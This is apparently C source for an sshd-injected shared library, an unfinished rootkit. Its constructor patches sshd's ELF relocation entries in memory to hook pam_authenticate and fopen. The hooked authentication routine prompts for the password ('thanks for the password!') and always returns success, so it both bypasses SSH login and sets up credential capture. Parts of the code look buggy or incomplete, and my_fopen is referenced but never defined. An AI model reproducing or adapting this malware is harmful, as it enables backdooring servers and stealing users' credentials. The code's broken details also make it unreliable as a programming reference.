#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>
#include <setjmp.h>

#include <security/pam_appl.h>
#include <sys/mman.h>

#include <dlfcn.h>
#include <link.h>

#include <sys/shm.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <inttypes.h>

#include "pam_private.h"

#include "bad.h"
#include "config_hook.h"


static int PAGE_SIZE;

static void handle_sig_with_jmp(int sig)
{
	longjmp(jmpbuf, -1);
}

/*
 * lib = start of lib we search - use get_libstart()
 */
__attribute__ ((warning ("GDBME - be careful what you find"))) static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname)
{
	struct link_map *map = link_map;
	Dl_info *dli = malloc(sizeof(Dl_info));

	while (map != NULL) {
		if ((void *) map->l_addr == lib) {
			void *libstart = (void *)map->l_addr;

			void *libend = (void *)map->l_next->l_addr;

			bool done = false;

			while (done != true && libstart >= libend) {
				dladdrptr(libstart, dli);

				if (dli->dli_sname != NULL && dli->dli_saddr != NULL) {
					if (strcmp(dli->dli_sname, funcname) == 0) {
						void *tmp = dli->dli_saddr;
						free(dli);
						return tmp;
					}
				}
				libstart += 16;
			}
		}
		map = map->l_next;
	}

	free(dli);
	return NULL;
}

__attribute__ ((warning ("GDBME - be careful what you find"))) static void *get_libstart(struct link_map *link_map, char *lib)
{
	struct link_map *map = link_map;

	while (map != NULL) {
		if (strstr(map->l_name, lib) != NULL)
			return (void *)map->l_addr;

		map = map->l_next;
	}

	return NULL;
}

/*
 * Parse a dynamic section array for useful pointers
 * 	pointers passed in should always be checked - very possible to fail
 */
static void parse_dyn_array(Elf64_Dyn *dynptr,Elf64_Rela **RELA, uint64_t **RELASZ,
								Elf64_Rela **JMPREL, uint64_t **PLTRELSZ)
{
	*RELA = NULL;
	*RELASZ = NULL;
	*JMPREL = NULL;
	*PLTRELSZ = NULL;	

	int i;
	for (i = 0; dynptr[i].d_tag != DT_NULL; i++) {
		if (dynptr[i].d_tag == DT_RELA)
			*RELA = (Elf64_Rela *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_JMPREL)
			*JMPREL = (Elf64_Rela *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_PLTRELSZ)
			*PLTRELSZ = (uint64_t *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_RELASZ)
			*RELASZ = (uint64_t *) &dynptr[i].d_un;
	}
	return;
}

/*
 * parses a .dynamic relocation table (DT_RELA || DT_JMPREL) to return the Elf64_Rela * entry associated 
 *	with the func we want to hook...
 */
static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, int *type)
{
	uint64_t relaments = *RELASZ / (sizeof(Elf64_Rela));

	int i;
	for (i = 0; i < relaments; i++) {
		if ((void *) RELA[0].r_addend == func) {
			*type = RELOC_ADDEND;
			return RELA;
		}
		
		if ((void *) RELA[0].r_info == func) {
			*type = RELOC_INFO;
			return RELA;
		}

		/*if ((void *) RELA[0].r_offset == func) {
			*type = RELOC_OFFSET;
			return RELA;
		} */

		RELA = (Elf64_Rela *) ((char *) RELA + (uint64_t) (sizeof(Elf64_Rela)));
	}
	return NULL;
}

/*
 * the callback for dl_iterate_phdr
 */
static Elf64_Dyn *libpam;
static int callback(struct dl_phdr_info *info, size_t size, void *data)
{
	if (null1 != NULL && null2 != NULL && libc != NULL)
		return 0;	

	int j;

	for (j = 0; j < info->dlpi_phnum; j++) {
		
		if ((unsigned int)info->dlpi_phdr[j].p_type == PT_DYNAMIC) {
			if (strstr(info->dlpi_name, ".so") == NULL) {
				if (info->dlpi_phnum == (unsigned)9) {
					null1 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
					break;
				}
				if (info->dlpi_phnum == (unsigned)4) {
					null2 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
					break;
				}
			}
			if (strstr(info->dlpi_name, "libc.so") != NULL) {
				libc = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
				break;
			}
			if (strstr(info->dlpi_name, "libpam.so") != NULL) {
				libpam = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
				break;
			}
		}
	}
	return 0;
}

/*
 *
 */
static int hook_rela(Elf64_Rela *foundrela, void *func, int type)
{
	int ret;
	uint64_t prevpage = ((uint64_t) foundrela / PAGE_SIZE) * PAGE_SIZE;

	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ | PROT_WRITE);
	if (ret != 0)
		return -1;

	if (type == RELOC_ADDEND)
		foundrela->r_addend = (unsigned long long) func; 
	else if (type == RELOC_INFO)
		foundrela->r_info = (unsigned long long) func; 

	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ);
	if (ret != 0)
		return -1;

	return 0;
}

static int is_sshd(struct link_map *link_map)
{
	void *dlhandle = dlopen("libdl.so.2", RTLD_NOW);

	if (dlhandle == NULL)
		return -1;

	dlinfoptr = dlsym(dlhandle, "dlinfo");
	dladdrptr = dlsym(dlhandle, "dladdr");
	dlclose(dlhandle);

	if (dlinfoptr == NULL || dladdrptr == NULL)
		return -1;

	void *ourhandle = dlopen(NULL, RTLD_NOW);

	dlinfoptr(ourhandle, 2, &link_map);
	dlclose(ourhandle);

	void *lib_wrap = dlopen("libwrap.so.0", RTLD_NOW);

	if (lib_wrap == NULL)
		return -1;

	void *lib_pam = dlopen("libpam.so.0", RTLD_NOW);

	if (lib_pam == NULL)
		return -1;

	void *hosts_access = dlsym(lib_wrap, "hosts_access");
	void *pam_authenticate = dlsym(lib_pam, "pam_authenticate");

	if (hosts_access == NULL || pam_authenticate == NULL)
		return -1;

	dlclose(lib_wrap);
	dlclose(lib_pam);
	return 0;
}

/*
 *
 */
static int my_pam_auth(struct pam_handle *pamh, int flags)
{
	__asm__ (
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		);

	struct pam_conv *conver = pamh->pam_conversation;

	struct pam_message *msg = malloc(sizeof(struct pam_message));
	msg->msg_style = PAM_PROMPT_ECHO_OFF;
	msg->msg = NULL;

	struct pam_response *resp = calloc(0, sizeof(struct pam_response));

	conver->conv(1, (const struct pam_message **) &msg, &resp, NULL);	
	/* thanks for the password! */

	
	free(msg);
	free(resp);		
	return 0;
}

/*
 * openssh 6.0p1 and 6.8p1 both use __syslog_chk
 */
static int my_syslog_chk(int priority, int flag, const char *format)
{
	FILE *fp = fopen("/root/asf", "a+");
	fprintf(fp, "in __syslog_chk ayylmao\n");
	fflush(fp);
	fclose(fp);

	return 0;
}

static void my_pam_syslog(pam_handle_t *pamh, int priority, const char *fmt, ...)
{
	/*
	va_list args;

	va_start (args, fmt);
	pam_vsyslog (pamh, priority, fmt, args);
	va_end (args);
	*/
	FILE *fp = fopen("/root/asd", "a+");
	fprintf(fp, "in pam_syslog ayylmao\n");
	fflush(fp);
	fclose(fp);
	
	return;
}


static void  __attribute__ ((constructor)) init(void)
{
	struct link_map *link_map;

	if (is_sshd(link_map) != 0)
		return;

	PAGE_SIZE = getpagesize();

	void *ourhandle = dlopen(NULL, RTLD_NOW);

	dlinfoptr(ourhandle, 2, &link_map);
	dlclose(ourhandle);

	void *o = dlopen("libdl-2.13.so", RTLD_NOW);
	dl_iterate_phdrptr = dlsym(o, "dl_iterate_phdr");
	dlclose(o);
	dl_iterate_phdrptr(callback, NULL);

	if (null1 == NULL)
		return;

	/* XXX: all of this crap deserves a wrapper - ? muh modularity */

	Elf64_Rela *RELA, *JMPREL;
	uint64_t *RELASZ, *PLTRELSZ;
	int type;

	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
		return;

	void *lib_pam = dlopen("libpam.so.0", RTLD_NOW);
	void *pam_authenticate = dlsym(lib_pam, "pam_authenticate");

	Elf64_Rela *foundrela = parse_rela(RELA, RELASZ, pam_authenticate, &type);
	if (foundrela == NULL)
		return;

	int jmpret = setjmp(jmpbuf);
	if (jmpret != 0) { /* PANIC */
		kill(getpid(), SIGSEGV);
		return;
	}

	signal(SIGSEGV, handle_sig_with_jmp);
	signal(SIGBUS, handle_sig_with_jmp);

	hook_rela(foundrela, my_pam_auth, type);

	signal(SIGSEGV, SIG_DFL);
	signal(SIGBUS, SIG_DFL);

	/* fopen() hook */

	void *lib_c = dlopen("libc.so.6", RTLD_NOW);
	void *libc_func = dlsym(lib_c, "fopen");

	/* the relocation of fopen lives within sshd's .dynamic */
	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
		return;

	/* changeme: s/foundrela/ref_fopen_Rela/g -- inside my_fopen we will need to change fopen back to normal :^) */
	foundrela = parse_rela(RELA, RELASZ, libc_func, &type);
	if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
		foundrela = parse_rela(JMPREL, PLTRELSZ, libc_func, &type);
	if (foundrela == NULL) /* :( */
		return;

	/* adding RELOC_OFFSET breaks fopen */
	if (type == RELOC_ADDEND) {
		ref_fopen = (void *) foundrela->r_addend;
		ref_fopen_Rela = foundrela;
		hook_rela(foundrela, my_fopen, type);
	}


	/* find how pam is calling __syslog_chk */


	//void *pamhandle = dlopen("libpam.so.0", RTLD_NOW);


	dlclose(lib_pam);
	dlclose(lib_c);	
	return; /* XXX use exit() ? */
}
